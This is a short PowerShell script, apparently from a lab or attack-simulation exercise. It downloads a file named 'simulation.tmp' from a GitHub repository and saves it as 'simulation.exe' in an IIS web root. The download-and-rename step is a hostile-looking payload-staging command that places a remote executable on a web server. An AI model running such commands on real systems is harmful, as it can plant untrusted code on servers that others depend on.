[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Tls,Tls11,Tls12'

Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aguggenberger/iv-lab/main/simulation.tmp' -OutFile 'C:\inetpub\wwwroot\simulation.exe'
